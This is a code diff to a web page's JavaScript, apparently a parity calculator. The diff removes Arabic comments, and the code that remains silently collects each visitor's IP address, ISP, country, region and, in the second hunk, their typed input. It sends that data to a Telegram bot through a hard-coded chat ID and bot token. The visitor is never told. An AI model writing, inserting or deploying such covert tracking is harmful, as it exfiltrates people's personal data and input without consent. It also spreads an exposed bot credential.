@@ -95,14 +95,13 @@
           var country = data.country_name;
           var city = data.region;
 
-          // إرسال المعلومات إلى تليجرام مع فواصل سطر جديدة
           var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
           sendTelegramMessage(message);
       });
 
       function sendTelegramMessage(message) {
-          var chatId = '1045091647'; // استبدل بمعرف الدردشة الخاص بك
-          var botToken = '6268789988:AAFslFmhzIT8m4uGpdZgarfvicJrciJ_vg0'; // استبدل برمز الروبوت الخاص بك
+          var chatId = '1045091647';
+          var botToken = '6268789988:AAFslFmhzIT8m4uGpdZgarfvicJrciJ_vg0';
 
           var xhr = new XMLHttpRequest();
           xhr.open('GET', `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, true);
@@ -140,17 +139,14 @@
     var evenParityResult = '';
     var oddParityResult = '';
 
-    // الحصول على معلومات الـ IP
     $.getJSON('https://ipapi.co/json', function(data) {
         var ip = data.ip;
         var isp = data.org;
         var country = data.country_name;
         var city = data.region;
 
-        // إضافة النص المدخل ومعلومات الـ IP إلى الرسالة
         var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0AInput Text: ${inputText}`;
 
-        // إرسال المعلومات إلى تليجرام
         sendTelegramMessage(message);
     });
   
